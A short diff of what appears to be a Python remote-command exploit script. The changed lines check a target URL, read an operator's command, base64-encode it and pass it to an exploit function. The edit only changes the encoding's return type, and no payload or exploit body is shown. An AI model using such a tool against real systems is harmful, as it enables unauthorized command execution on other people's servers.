@@ -111,6 +111,6 @@ if __name__ == "__main__":
         print('[i] Checking Target...')
         if checkTarget(url):
             cmd = input("Input Your Command:\n")
-            command = str(base64.b64encode(cmd.encode('utf-8')), "utf-8")
+            command = base64.b64encode(cmd.encode('utf-8'))
             exploit(url,command)
         
